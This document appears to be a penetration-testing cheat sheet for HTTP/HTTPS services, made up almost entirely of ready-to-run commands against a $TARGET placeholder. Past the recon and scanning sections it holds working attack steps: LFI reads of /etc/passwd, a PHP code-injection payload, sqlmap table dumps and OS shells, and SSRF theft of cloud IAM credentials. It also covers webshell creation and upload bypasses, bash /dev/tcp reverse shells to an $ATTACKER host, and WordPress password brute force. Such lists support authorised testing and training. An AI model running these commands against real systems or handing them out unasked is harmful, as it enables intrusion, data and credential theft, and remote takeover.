---
id: "1hldioyqompsit7n1"
title: "http_https"
description: ""
tags: []
order: 3
createdAt: "2026-05-30T15:43:37.453Z"
updatedAt: "2026-05-30T15:43:49.686Z"
---

## Port Discovery & Banner Grabbing
<!-- section: {"id":"g61ri9op0mpsitgpm","order":0,"collapsed":false} -->

### pbuck6e5vmpsitgrn
```bash
nmap -sV -sC -p 80,443,8080,8443,8000,8888 $TARGET
```

_Port Discovery & Banner Grabbing_

**Tags:** http, https, nmap, banner, recon, discovery
<!-- cmd: {"id":"pbuck6e5vmpsitgrn","language":"bash","sectionId":"g61ri9op0mpsitgpm","tags":["http","https","nmap","banner","recon","discovery"]} -->

### 5wukqfz72mpsitgrt
```bash
rustscan -a $TARGET -p 80,443,8080,8443 -- -sV -sC
```

**Tags:** http, https, nmap, banner, recon, discovery
<!-- cmd: {"id":"5wukqfz72mpsitgrt","language":"bash","sectionId":"g61ri9op0mpsitgpm","tags":["http","https","nmap","banner","recon","discovery"]} -->

### xb51k66nwmpsitgrx
```bash
whatweb http://$TARGET
```

**Tags:** http, https, nmap, banner, recon, discovery
<!-- cmd: {"id":"xb51k66nwmpsitgrx","language":"bash","sectionId":"g61ri9op0mpsitgpm","tags":["http","https","nmap","banner","recon","discovery"]} -->

### sre81ncwumpsitgs0
```bash
curl -sk -I http://$TARGET
```

**Tags:** http, https, nmap, banner, recon, discovery
<!-- cmd: {"id":"sre81ncwumpsitgs0","language":"bash","sectionId":"g61ri9op0mpsitgpm","tags":["http","https","nmap","banner","recon","discovery"]} -->

### l8dogb5edmpsitgs4
```bash
curl -sk -I https://$TARGET --resolve $TARGET:443:$TARGET
```

**Tags:** http, https, nmap, banner, recon, discovery
<!-- cmd: {"id":"l8dogb5edmpsitgs4","language":"bash","sectionId":"g61ri9op0mpsitgpm","tags":["http","https","nmap","banner","recon","discovery"]} -->

## Nikto Web Vulnerability Scan
<!-- section: {"id":"8okx771qcmpsitgpp","order":1,"collapsed":false} -->

### tlxt8dz46mpsitgsj
```bash
nikto -h http://$TARGET
```

_Nikto Web Vulnerability Scan_

**Tags:** http, nikto, vulnerability-scan, recon
<!-- cmd: {"id":"tlxt8dz46mpsitgsj","language":"bash","sectionId":"8okx771qcmpsitgpp","tags":["http","nikto","vulnerability-scan","recon"]} -->

### jtjmha50cmpsitgsn
```bash
nikto -h https://$TARGET -ssl
```

**Tags:** http, nikto, vulnerability-scan, recon
<!-- cmd: {"id":"jtjmha50cmpsitgsn","language":"bash","sectionId":"8okx771qcmpsitgpp","tags":["http","nikto","vulnerability-scan","recon"]} -->

### 0aoyamy6ompsitgsq
```bash
nikto -h http://$TARGET -port 8080 -output nikto.txt
```

**Tags:** http, nikto, vulnerability-scan, recon
<!-- cmd: {"id":"0aoyamy6ompsitgsq","language":"bash","sectionId":"8okx771qcmpsitgpp","tags":["http","nikto","vulnerability-scan","recon"]} -->

### 3d1i6ayx0mpsitgsu
```bash
nikto -h http://$TARGET -Tuning 9 -maxtime 60s
```

**Tags:** http, nikto, vulnerability-scan, recon
<!-- cmd: {"id":"3d1i6ayx0mpsitgsu","language":"bash","sectionId":"8okx771qcmpsitgpp","tags":["http","nikto","vulnerability-scan","recon"]} -->

## Directory & File Brute Force
<!-- section: {"id":"quzeia0thmpsitgpt","order":2,"collapsed":false} -->

### i8w1q80uhmpsitgt4
```bash
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403 -t 50
```

_Directory & File Brute Force_

**Tags:** http, ffuf, feroxbuster, gobuster, directory-brute, fuzzing
<!-- cmd: {"id":"i8w1q80uhmpsitgt4","language":"bash","sectionId":"quzeia0thmpsitgpt","tags":["http","ffuf","feroxbuster","gobuster","directory-brute","fuzzing"]} -->

### 54lrlrplrmpsitgt7
```bash
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -e .php,.asp,.aspx,.txt,.bak,.zip -mc 200,301,302
```

**Tags:** http, ffuf, feroxbuster, gobuster, directory-brute, fuzzing
<!-- cmd: {"id":"54lrlrplrmpsitgt7","language":"bash","sectionId":"quzeia0thmpsitgpt","tags":["http","ffuf","feroxbuster","gobuster","directory-brute","fuzzing"]} -->

### sgg33vjtimpsitgtb
```bash
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -recursion -recursion-depth 3
```

**Tags:** http, ffuf, feroxbuster, gobuster, directory-brute, fuzzing
<!-- cmd: {"id":"sgg33vjtimpsitgtb","language":"bash","sectionId":"quzeia0thmpsitgpt","tags":["http","ffuf","feroxbuster","gobuster","directory-brute","fuzzing"]} -->

### g6y5wxti1mpsitgtf
```bash
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,aspx,txt,bak -t 50 --auto-tune
```

**Tags:** http, ffuf, feroxbuster, gobuster, directory-brute, fuzzing
<!-- cmd: {"id":"g6y5wxti1mpsitgtf","language":"bash","sectionId":"quzeia0thmpsitgpt","tags":["http","ffuf","feroxbuster","gobuster","directory-brute","fuzzing"]} -->

### e7d92iyv2mpsitgti
```bash
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,aspx,txt -t 40
```

**Tags:** http, ffuf, feroxbuster, gobuster, directory-brute, fuzzing
<!-- cmd: {"id":"e7d92iyv2mpsitgti","language":"bash","sectionId":"quzeia0thmpsitgpt","tags":["http","ffuf","feroxbuster","gobuster","directory-brute","fuzzing"]} -->

### ml639q98mmpsitgtn
```bash
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

**Tags:** http, ffuf, feroxbuster, gobuster, directory-brute, fuzzing
<!-- cmd: {"id":"ml639q98mmpsitgtn","language":"bash","sectionId":"quzeia0thmpsitgpt","tags":["http","ffuf","feroxbuster","gobuster","directory-brute","fuzzing"]} -->

## Virtual Host / Subdomain Fuzzing
<!-- section: {"id":"1rg382uq9mpsitgpw","order":3,"collapsed":false} -->

### 9ztgylljrmpsitgu3
```bash
ffuf -u http://$TARGET -H "Host: FUZZ.$DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302 -fs 0
```

_Virtual Host / Subdomain Fuzzing_

**Tags:** http, vhost, subdomain, ffuf, wfuzz, fuzzing
<!-- cmd: {"id":"9ztgylljrmpsitgu3","language":"bash","sectionId":"1rg382uq9mpsitgpw","tags":["http","vhost","subdomain","ffuf","wfuzz","fuzzing"]} -->

### wqc4byertmpsitgu7
```bash
gobuster vhost -u http://$TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

**Tags:** http, vhost, subdomain, ffuf, wfuzz, fuzzing
<!-- cmd: {"id":"wqc4byertmpsitgu7","language":"bash","sectionId":"1rg382uq9mpsitgpw","tags":["http","vhost","subdomain","ffuf","wfuzz","fuzzing"]} -->

### sdttoedp6mpsitgub
```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMAIN" --hc 404 http://$TARGET
```

**Tags:** http, vhost, subdomain, ffuf, wfuzz, fuzzing
<!-- cmd: {"id":"sdttoedp6mpsitgub","language":"bash","sectionId":"1rg382uq9mpsitgpw","tags":["http","vhost","subdomain","ffuf","wfuzz","fuzzing"]} -->

## Parameter Discovery
<!-- section: {"id":"057ns44qbmpsitgpz","order":4,"collapsed":false} -->

### r44uyxgpumpsitgup
```bash
ffuf -u "http://$TARGET/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs 0
```

_Parameter Discovery_

**Tags:** http, parameter-fuzzing, ffuf, wfuzz, lfi
<!-- cmd: {"id":"r44uyxgpumpsitgup","language":"bash","sectionId":"057ns44qbmpsitgpz","tags":["http","parameter-fuzzing","ffuf","wfuzz","lfi"]} -->

### frch2r4q0mpsitgut
```bash
ffuf -u "http://$TARGET/login" -X POST -d "FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200
```

**Tags:** http, parameter-fuzzing, ffuf, wfuzz, lfi
<!-- cmd: {"id":"frch2r4q0mpsitgut","language":"bash","sectionId":"057ns44qbmpsitgpz","tags":["http","parameter-fuzzing","ffuf","wfuzz","lfi"]} -->

### afkb6miuumpsitgux
```bash
ffuf -u "http://$TARGET/search?q=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0
```

**Tags:** http, parameter-fuzzing, ffuf, wfuzz, lfi
<!-- cmd: {"id":"afkb6miuumpsitgux","language":"bash","sectionId":"057ns44qbmpsitgpz","tags":["http","parameter-fuzzing","ffuf","wfuzz","lfi"]} -->

## LFI / Path Traversal
<!-- section: {"id":"jvnhlo7kpmpsitgq3","order":5,"collapsed":false} -->

### x5yfvsippmpsitgv6
```bash
ffuf -u "http://$TARGET/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 0
```

_LFI / Path Traversal_

**Tags:** http, lfi, path-traversal, ffuf, wfuzz
<!-- cmd: {"id":"x5yfvsippmpsitgv6","language":"bash","sectionId":"jvnhlo7kpmpsitgq3","tags":["http","lfi","path-traversal","ffuf","wfuzz"]} -->

### paake4lq9mpsitgva
```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 "http://$TARGET/page?file=FUZZ"
```

**Tags:** http, lfi, path-traversal, ffuf, wfuzz
<!-- cmd: {"id":"paake4lq9mpsitgva","language":"bash","sectionId":"jvnhlo7kpmpsitgq3","tags":["http","lfi","path-traversal","ffuf","wfuzz"]} -->

### mjcl6cbwjmpsitgvd
```bash
curl "http://$TARGET/page?file=../../../../etc/passwd"
```

**Tags:** http, lfi, path-traversal, ffuf, wfuzz
<!-- cmd: {"id":"mjcl6cbwjmpsitgvd","language":"bash","sectionId":"jvnhlo7kpmpsitgq3","tags":["http","lfi","path-traversal","ffuf","wfuzz"]} -->

### putom75vnmpsitgvg
```bash
curl "http://$TARGET/page?file=....//....//....//etc/passwd"
```

**Tags:** http, lfi, path-traversal, ffuf, wfuzz
<!-- cmd: {"id":"putom75vnmpsitgvg","language":"bash","sectionId":"jvnhlo7kpmpsitgq3","tags":["http","lfi","path-traversal","ffuf","wfuzz"]} -->

### 2r43huenfmpsitgvk
```bash
curl "http://$TARGET/page?file=php://filter/convert.base64-encode/resource=/etc/passwd"
```

**Tags:** http, lfi, path-traversal, ffuf, wfuzz
<!-- cmd: {"id":"2r43huenfmpsitgvk","language":"bash","sectionId":"jvnhlo7kpmpsitgq3","tags":["http","lfi","path-traversal","ffuf","wfuzz"]} -->

### e4vmus46jmpsitgvn
```bash
curl "http://$TARGET/page?file=php://input" --data '<?php system($_GET["cmd"]); ?>'
```

**Tags:** http, lfi, path-traversal, ffuf, wfuzz
<!-- cmd: {"id":"e4vmus46jmpsitgvn","language":"bash","sectionId":"jvnhlo7kpmpsitgq3","tags":["http","lfi","path-traversal","ffuf","wfuzz"]} -->

## SQL Injection
<!-- section: {"id":"m2rhux4nlmpsitgq6","order":6,"collapsed":false} -->

### a9qofasxgmpsitgw3
```bash
sqlmap -u "http://$TARGET/page?id=1" --batch --dbs
```

_SQL Injection_

**Tags:** http, sqli, sqlmap, database, exploitation
<!-- cmd: {"id":"a9qofasxgmpsitgw3","language":"bash","sectionId":"m2rhux4nlmpsitgq6","tags":["http","sqli","sqlmap","database","exploitation"]} -->

### tkmhy0miimpsitgw7
```bash
sqlmap -u "http://$TARGET/page?id=1" --batch -D $DBNAME --tables
```

**Tags:** http, sqli, sqlmap, database, exploitation
<!-- cmd: {"id":"tkmhy0miimpsitgw7","language":"bash","sectionId":"m2rhux4nlmpsitgq6","tags":["http","sqli","sqlmap","database","exploitation"]} -->

### xs9ft3otimpsitgwa
```bash
sqlmap -u "http://$TARGET/page?id=1" --batch -D $DBNAME -T users --dump
```

**Tags:** http, sqli, sqlmap, database, exploitation
<!-- cmd: {"id":"xs9ft3otimpsitgwa","language":"bash","sectionId":"m2rhux4nlmpsitgq6","tags":["http","sqli","sqlmap","database","exploitation"]} -->

### 83j0fkywbmpsitgwe
```bash
sqlmap -u "http://$TARGET/login" --data "user=admin&pass=test" --batch --dbs
```

**Tags:** http, sqli, sqlmap, database, exploitation
<!-- cmd: {"id":"83j0fkywbmpsitgwe","language":"bash","sectionId":"m2rhux4nlmpsitgq6","tags":["http","sqli","sqlmap","database","exploitation"]} -->

### ucdw7rnnqmpsitgwi
```bash
sqlmap -r request.txt --batch --level 5 --risk 3 --dbs
```

**Tags:** http, sqli, sqlmap, database, exploitation
<!-- cmd: {"id":"ucdw7rnnqmpsitgwi","language":"bash","sectionId":"m2rhux4nlmpsitgq6","tags":["http","sqli","sqlmap","database","exploitation"]} -->

### 2kthjkb6kmpsitgwl
```bash
sqlmap -u "http://$TARGET/page?id=1" --batch --os-shell
```

**Tags:** http, sqli, sqlmap, database, exploitation
<!-- cmd: {"id":"2kthjkb6kmpsitgwl","language":"bash","sectionId":"m2rhux4nlmpsitgq6","tags":["http","sqli","sqlmap","database","exploitation"]} -->

## Nuclei — Automated Vulnerability Scanning
<!-- section: {"id":"r2b9d7wu1mpsitgqa","order":7,"collapsed":false} -->

### g88qlj3cempsitgww
```bash
nuclei -u http://$TARGET -t /root/nuclei-templates/ -o nuclei_results.txt
```

_Nuclei — Automated Vulnerability Scanning_

**Tags:** http, nuclei, vulnerability-scan, cve, automation
<!-- cmd: {"id":"g88qlj3cempsitgww","language":"bash","sectionId":"r2b9d7wu1mpsitgqa","tags":["http","nuclei","vulnerability-scan","cve","automation"]} -->

### y7zc0chcampsitgx0
```bash
nuclei -u http://$TARGET -tags cve,rce,sqli,xss
```

**Tags:** http, nuclei, vulnerability-scan, cve, automation
<!-- cmd: {"id":"y7zc0chcampsitgx0","language":"bash","sectionId":"r2b9d7wu1mpsitgqa","tags":["http","nuclei","vulnerability-scan","cve","automation"]} -->

### gkqqarw8vmpsitgx3
```bash
nuclei -u http://$TARGET -severity critical,high
```

**Tags:** http, nuclei, vulnerability-scan, cve, automation
<!-- cmd: {"id":"gkqqarw8vmpsitgx3","language":"bash","sectionId":"r2b9d7wu1mpsitgqa","tags":["http","nuclei","vulnerability-scan","cve","automation"]} -->

### gbkxtivofmpsitgx7
```bash
nuclei -l targets.txt -t /root/nuclei-templates/ -o results.txt -c 50
```

**Tags:** http, nuclei, vulnerability-scan, cve, automation
<!-- cmd: {"id":"gbkxtivofmpsitgx7","language":"bash","sectionId":"r2b9d7wu1mpsitgqa","tags":["http","nuclei","vulnerability-scan","cve","automation"]} -->

### udm0t2udtmpsitgxb
```bash
nuclei -u http://$TARGET -tags cve2024,cve2023
```

**Tags:** http, nuclei, vulnerability-scan, cve, automation
<!-- cmd: {"id":"udm0t2udtmpsitgxb","language":"bash","sectionId":"r2b9d7wu1mpsitgqa","tags":["http","nuclei","vulnerability-scan","cve","automation"]} -->

## Authentication Bypass Techniques
<!-- section: {"id":"hzhkro7gympsitgqe","order":8,"collapsed":false} -->

### yoaoc4y0lmpsitgxl
```bash
ffuf -u http://$TARGET/login -X POST -d "username=FUZZ&password=FUZZ" -w /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
```

_Authentication Bypass Techniques_

**Tags:** http, auth-bypass, jwt, headers, default-creds
<!-- cmd: {"id":"yoaoc4y0lmpsitgxl","language":"bash","sectionId":"hzhkro7gympsitgqe","tags":["http","auth-bypass","jwt","headers","default-creds"]} -->

### ty8f9tbmympsitgxp
```bash
curl http://$TARGET/admin/
```

**Tags:** http, auth-bypass, jwt, headers, default-creds
<!-- cmd: {"id":"ty8f9tbmympsitgxp","language":"bash","sectionId":"hzhkro7gympsitgqe","tags":["http","auth-bypass","jwt","headers","default-creds"]} -->

### akv425gvhmpsitgxt
```bash
curl http://$TARGET/%2fadmin/
```

**Tags:** http, auth-bypass, jwt, headers, default-creds
<!-- cmd: {"id":"akv425gvhmpsitgxt","language":"bash","sectionId":"hzhkro7gympsitgqe","tags":["http","auth-bypass","jwt","headers","default-creds"]} -->

### ea5lkx9gkmpsitgxv
```bash
curl -H "X-Original-URL: /admin" http://$TARGET/
```

**Tags:** http, auth-bypass, jwt, headers, default-creds
<!-- cmd: {"id":"ea5lkx9gkmpsitgxv","language":"bash","sectionId":"hzhkro7gympsitgqe","tags":["http","auth-bypass","jwt","headers","default-creds"]} -->

### ai5oat5wumpsitgxz
```bash
curl -H "X-Rewrite-URL: /admin" http://$TARGET/
```

**Tags:** http, auth-bypass, jwt, headers, default-creds
<!-- cmd: {"id":"ai5oat5wumpsitgxz","language":"bash","sectionId":"hzhkro7gympsitgqe","tags":["http","auth-bypass","jwt","headers","default-creds"]} -->

### iv2tjje65mpsitgy2
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://$TARGET/admin/
```

**Tags:** http, auth-bypass, jwt, headers, default-creds
<!-- cmd: {"id":"iv2tjje65mpsitgy2","language":"bash","sectionId":"hzhkro7gympsitgqe","tags":["http","auth-bypass","jwt","headers","default-creds"]} -->

### vd6qx0xq9mpsitgy6
```bash
python3 jwt_tool.py <TOKEN> -X a
```

**Tags:** http, auth-bypass, jwt, headers, default-creds
<!-- cmd: {"id":"vd6qx0xq9mpsitgy6","language":"bash","sectionId":"hzhkro7gympsitgqe","tags":["http","auth-bypass","jwt","headers","default-creds"]} -->

## SSRF Detection & Exploitation
<!-- section: {"id":"t54avoyw1mpsitgqh","order":9,"collapsed":false} -->

### rt0x3cdeempsitgyo
```bash
curl "http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
```

_SSRF Detection & Exploitation_

**Tags:** http, ssrf, cloud, exploitation
<!-- cmd: {"id":"rt0x3cdeempsitgyo","language":"bash","sectionId":"t54avoyw1mpsitgqh","tags":["http","ssrf","cloud","exploitation"]} -->

### n7zg9hb4umpsitgys
```bash
curl "http://$TARGET/fetch?url=http://127.0.0.1:8080/"
```

**Tags:** http, ssrf, cloud, exploitation
<!-- cmd: {"id":"n7zg9hb4umpsitgys","language":"bash","sectionId":"t54avoyw1mpsitgqh","tags":["http","ssrf","cloud","exploitation"]} -->

### abso1qxl9mpsitgyw
```bash
ffuf -u "http://$TARGET/fetch?url=FUZZ" -w /usr/share/seclists/Fuzzing/SSRF/SSRF-payloads.txt
```

**Tags:** http, ssrf, cloud, exploitation
<!-- cmd: {"id":"abso1qxl9mpsitgyw","language":"bash","sectionId":"t54avoyw1mpsitgqh","tags":["http","ssrf","cloud","exploitation"]} -->

### 3z2o4ba4kmpsitgz0
```bash
curl "http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Tags:** http, ssrf, cloud, exploitation
<!-- cmd: {"id":"3z2o4ba4kmpsitgz0","language":"bash","sectionId":"t54avoyw1mpsitgqh","tags":["http","ssrf","cloud","exploitation"]} -->

## File Upload Testing
<!-- section: {"id":"yz5kdl2i4mpsitgqk","order":10,"collapsed":false} -->

### wyxk3pvs1mpsitgzf
```bash
curl -F "file=@shell.php;type=image/jpeg" http://$TARGET/upload
```

_File Upload Testing_

**Tags:** http, file-upload, webshell, bypass, exploitation
<!-- cmd: {"id":"wyxk3pvs1mpsitgzf","language":"bash","sectionId":"yz5kdl2i4mpsitgqk","tags":["http","file-upload","webshell","bypass","exploitation"]} -->

### t68ace1uhmpsitgzj
```bash
mv shell.php shell.php.jpg
```

**Tags:** http, file-upload, webshell, bypass, exploitation
<!-- cmd: {"id":"t68ace1uhmpsitgzj","language":"bash","sectionId":"yz5kdl2i4mpsitgqk","tags":["http","file-upload","webshell","bypass","exploitation"]} -->

### mixykv4fhmpsitgzm
```bash
curl -F "file=@shell.php.jpg" http://$TARGET/upload
```

**Tags:** http, file-upload, webshell, bypass, exploitation
<!-- cmd: {"id":"mixykv4fhmpsitgzm","language":"bash","sectionId":"yz5kdl2i4mpsitgqk","tags":["http","file-upload","webshell","bypass","exploitation"]} -->

### vfxl6buzvmpsitgzp
```bash
curl -F "file=@shell.php%00.jpg" http://$TARGET/upload
```

**Tags:** http, file-upload, webshell, bypass, exploitation
<!-- cmd: {"id":"vfxl6buzvmpsitgzp","language":"bash","sectionId":"yz5kdl2i4mpsitgqk","tags":["http","file-upload","webshell","bypass","exploitation"]} -->

### 8za2n1fdpmpsitgzt
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Tags:** http, file-upload, webshell, bypass, exploitation
<!-- cmd: {"id":"8za2n1fdpmpsitgzt","language":"bash","sectionId":"yz5kdl2i4mpsitgqk","tags":["http","file-upload","webshell","bypass","exploitation"]} -->

### degghkyvxmpsitgzw
```bash
curl "http://$TARGET/uploads/shell.php?cmd=id"
```

**Tags:** http, file-upload, webshell, bypass, exploitation
<!-- cmd: {"id":"degghkyvxmpsitgzw","language":"bash","sectionId":"yz5kdl2i4mpsitgqk","tags":["http","file-upload","webshell","bypass","exploitation"]} -->

## Reverse Shell via Web Exploitation
<!-- section: {"id":"e2kn1nwabmpsitgqo","order":11,"collapsed":false} -->

### l6qgz9xl3mpsith07
```bash
curl "http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER/4444+0>%261'"
```

_Reverse Shell via Web Exploitation_

**Tags:** http, reverse-shell, rce, exploitation
<!-- cmd: {"id":"l6qgz9xl3mpsith07","language":"bash","sectionId":"e2kn1nwabmpsitgqo","tags":["http","reverse-shell","rce","exploitation"]} -->

### jr9s5ti4zmpsith0a
```bash
curl "http://$TARGET/rce?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/$ATTACKER/4444%200%3E%261%27"
```

**Tags:** http, reverse-shell, rce, exploitation
<!-- cmd: {"id":"jr9s5ti4zmpsith0a","language":"bash","sectionId":"e2kn1nwabmpsitgqo","tags":["http","reverse-shell","rce","exploitation"]} -->

### b2p4rk773mpsith0f
```bash
nc -lvnp 4444
```

**Tags:** http, reverse-shell, rce, exploitation
<!-- cmd: {"id":"b2p4rk773mpsith0f","language":"bash","sectionId":"e2kn1nwabmpsitgqo","tags":["http","reverse-shell","rce","exploitation"]} -->

## Certificate / TLS Inspection
<!-- section: {"id":"kxwf022b5mpsitgqs","order":12,"collapsed":false} -->

### 4s7xtjsncmpsith0v
```bash
nmap --script ssl-enum-ciphers -p 443 $TARGET
```

_Certificate / TLS Inspection_

**Tags:** https, tls, ssl, certificate, recon
<!-- cmd: {"id":"4s7xtjsncmpsith0v","language":"bash","sectionId":"kxwf022b5mpsitgqs","tags":["https","tls","ssl","certificate","recon"]} -->

### owgiulzx0mpsith0y
```bash
sslscan $TARGET:443
```

**Tags:** https, tls, ssl, certificate, recon
<!-- cmd: {"id":"owgiulzx0mpsith0y","language":"bash","sectionId":"kxwf022b5mpsitgqs","tags":["https","tls","ssl","certificate","recon"]} -->

### ypiq5njuhmpsith12
```bash
testssl.sh $TARGET:443
```

**Tags:** https, tls, ssl, certificate, recon
<!-- cmd: {"id":"ypiq5njuhmpsith12","language":"bash","sectionId":"kxwf022b5mpsitgqs","tags":["https","tls","ssl","certificate","recon"]} -->

### 35w8qaa31mpsith15
```bash
openssl s_client -connect $TARGET:443 < /dev/null | openssl x509 -noout -text
```

**Tags:** https, tls, ssl, certificate, recon
<!-- cmd: {"id":"35w8qaa31mpsith15","language":"bash","sectionId":"kxwf022b5mpsitgqs","tags":["https","tls","ssl","certificate","recon"]} -->

## Common Misconfigurations
<!-- section: {"id":"9tpfhidrompsitgqv","order":13,"collapsed":false} -->

### tuq25yonwmpsith1g
```bash
curl -X OPTIONS http://$TARGET -v
```

_Common Misconfigurations_

**Tags:** http, misconfiguration, methods, git-exposure, headers
<!-- cmd: {"id":"tuq25yonwmpsith1g","language":"bash","sectionId":"9tpfhidrompsitgqv","tags":["http","misconfiguration","methods","git-exposure","headers"]} -->

### ptteaj09dmpsith1k
```bash
nmap --script http-methods -p 80,443 $TARGET
```

**Tags:** http, misconfiguration, methods, git-exposure, headers
<!-- cmd: {"id":"ptteaj09dmpsith1k","language":"bash","sectionId":"9tpfhidrompsitgqv","tags":["http","misconfiguration","methods","git-exposure","headers"]} -->

### xozvbdt5jmpsith1n
```bash
curl -X TRACE http://$TARGET
```

**Tags:** http, misconfiguration, methods, git-exposure, headers
<!-- cmd: {"id":"xozvbdt5jmpsith1n","language":"bash","sectionId":"9tpfhidrompsitgqv","tags":["http","misconfiguration","methods","git-exposure","headers"]} -->

### jza0y2jvwmpsith1r
```bash
curl -v "http://$TARGET/redirect?url=https://evil.com"
```

**Tags:** http, misconfiguration, methods, git-exposure, headers
<!-- cmd: {"id":"jza0y2jvwmpsith1r","language":"bash","sectionId":"9tpfhidrompsitgqv","tags":["http","misconfiguration","methods","git-exposure","headers"]} -->

### d2cfhsct0mpsith1v
```bash
curl http://$TARGET/.git/HEAD
```

**Tags:** http, misconfiguration, methods, git-exposure, headers
<!-- cmd: {"id":"d2cfhsct0mpsith1v","language":"bash","sectionId":"9tpfhidrompsitgqv","tags":["http","misconfiguration","methods","git-exposure","headers"]} -->

### j4o5ziehompsith1z
```bash
git-dumper http://$TARGET/.git ./git_dump
```

**Tags:** http, misconfiguration, methods, git-exposure, headers
<!-- cmd: {"id":"j4o5ziehompsith1z","language":"bash","sectionId":"9tpfhidrompsitgqv","tags":["http","misconfiguration","methods","git-exposure","headers"]} -->

### jjmgphw6dmpsith22
```bash
ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/CommonBackupExtensions.fuzz.txt
```

**Tags:** http, misconfiguration, methods, git-exposure, headers
<!-- cmd: {"id":"jjmgphw6dmpsith22","language":"bash","sectionId":"9tpfhidrompsitgqv","tags":["http","misconfiguration","methods","git-exposure","headers"]} -->

### 6hirrkbnimpsith27
```bash
curl -sk -I http://$TARGET | grep -iE "x-frame|content-security|strict-transport|x-content-type"
```

**Tags:** http, misconfiguration, methods, git-exposure, headers
<!-- cmd: {"id":"6hirrkbnimpsith27","language":"bash","sectionId":"9tpfhidrompsitgqv","tags":["http","misconfiguration","methods","git-exposure","headers"]} -->

## WordPress Specific
<!-- section: {"id":"nwd8stfhimpsitgqz","order":14,"collapsed":false} -->

### moa2knqsumpsith2m
```bash
wpscan --url http://$TARGET --enumerate u,p,t,cb,dbe --api-token $WPSCAN_TOKEN
```

_WordPress Specific_

**Tags:** http, wordpress, wpscan, cms, enumeration
<!-- cmd: {"id":"moa2knqsumpsith2m","language":"bash","sectionId":"nwd8stfhimpsitgqz","tags":["http","wordpress","wpscan","cms","enumeration"]} -->

### k6378w86umpsith2q
```bash
wpscan --url http://$TARGET -U users.txt -P passwords.txt
```

**Tags:** http, wordpress, wpscan, cms, enumeration
<!-- cmd: {"id":"k6378w86umpsith2q","language":"bash","sectionId":"nwd8stfhimpsitgqz","tags":["http","wordpress","wpscan","cms","enumeration"]} -->

### xprmena57mpsith2u
```bash
wpscan --url http://$TARGET --enumerate vp --plugins-detection aggressive
```

**Tags:** http, wordpress, wpscan, cms, enumeration
<!-- cmd: {"id":"xprmena57mpsith2u","language":"bash","sectionId":"nwd8stfhimpsitgqz","tags":["http","wordpress","wpscan","cms","enumeration"]} -->
